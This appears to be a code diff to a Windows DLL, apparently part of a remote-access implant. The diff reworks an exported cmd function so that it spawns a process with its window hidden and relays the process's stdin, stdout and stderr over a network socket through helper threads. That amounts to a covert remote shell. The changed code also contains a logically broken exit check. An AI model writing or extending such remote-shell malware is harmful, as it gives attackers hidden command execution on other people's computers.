@@ -5,12 +5,19 @@
 
 #define SIZE 4096
 
-static char out_buf[SIZE];
-static char err_buf[SIZE];
-static char in_buf[SIZE];
+typedef struct {
+    HANDLE fHand;
+    char *buf;
+} hand_buf;
 
-VOID CALLBACK cb_out(DWORD dwErrorCode, DWORD dwNumberOfBytesTransfered, LPOVERLAPPED lpOverlapped);
-VOID CALLBACK cb_err(DWORD dwErrorCode, DWORD dwNumberOfBytesTransfered, LPOVERLAPPED lpOverlapped);
+void helper(hand_buf *arg)
+{
+    DWORD num;
+    for(;;){
+        ReadFile(arg->fHand, arg->buf, SIZE, &num, NULL);
+        send(DllMeta.net.sock, arg->buf, num, 0);
+    }
+}
 
 extern "C" __declspec(dllexport) void cmd(const char *arg)
 {
@@ -18,9 +25,13 @@ extern "C" __declspec(dllexport) void cmd(const char *arg)
     
     attr.nLength = sizeof(SECURITY_ATTRIBUTES);
     attr.lpSecurityDescriptor = NULL;
-    attr.bInheritHandle = TRUE;
-    
+    attr.bInheritHandle = TRUE;   
+
     HANDLE rStdOut, rStdErr, rStdIn;
+
+    char out_buf[SIZE];
+    char err_buf[SIZE];
+    char in_buf[SIZE];
     
     STARTUPINFO info;    
     
@@ -31,7 +42,9 @@ extern "C" __declspec(dllexport) void cmd(const char *arg)
     CreatePipe(&rStdErr, &info.hStdError, &attr, SIZE);
     CreatePipe(&info.hStdInput, &rStdIn, &attr, SIZE);
     
-    info.dwFlags |= STARTF_USESTDHANDLES;
+    info.dwFlags = STARTF_USESTDHANDLES | STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
+    info.wShowWindow = SW_HIDE;
+    
     
     PROCESS_INFORMATION proc_info;
     
@@ -54,33 +67,26 @@ extern "C" __declspec(dllexport) void cmd(const char *arg)
 
     OVERLAPPED over;
     DWORD num;
-    int which;
+
+    hand_buf out = { rStdOut, out_buf };
+    hand_buf err = { rStdErr, err_buf };
+
+    HANDLE helpA = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&helper, &out, 0, NULL);
+    HANDLE helpB = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&helper, &err, 0, NULL);
     
     for(;;){
-        which = WaitForMultipleObjects(1, &rStdOut, FALSE, INFINITE);
-        
-        switch(which){
-            case 1:
-                ReadFile(rStdOut, out_buf, SIZE, &num, NULL);
-                send(DllMeta.net.sock, out_buf, num, 0);
-                break;
-            
-            
-            default:
-                break;
-        }
+        num = recv(DllMeta.net.sock, in_buf, SIZE, 0);
+        WriteFile(rStdIn, in_buf, num, NULL, NULL);
+        if(!strstr("exit", in_buf)) break;
     }
+    
+    TerminateThread(helpA, 0);
+    TerminateThread(helpB, 0);
+    
+    CloseHandle(rStdOut);
+    CloseHandle(rStdErr);
+    CloseHandle(rStdIn);
+    CloseHandle(info.hStdOutput);
+    CloseHandle(info.hStdInput);
+    CloseHandle(info.hStdError);
 }
-
-
-VOID CALLBACK cb_out(DWORD dwErrorCode, DWORD dwNumberOfBytesTransfered, LPOVERLAPPED lpOverlapped)
-{
-    send(DllMeta.net.sock, out_buf, dwNumberOfBytesTransfered, 0);
-}
-
-VOID CALLBACK cb_err(DWORD dwErrorCode, DWORD dwNumberOfBytesTransfered, LPOVERLAPPED lpOverlapped)
-{
-    send(DllMeta.net.sock, err_buf, dwNumberOfBytesTransfered, 0);
-}
-
-
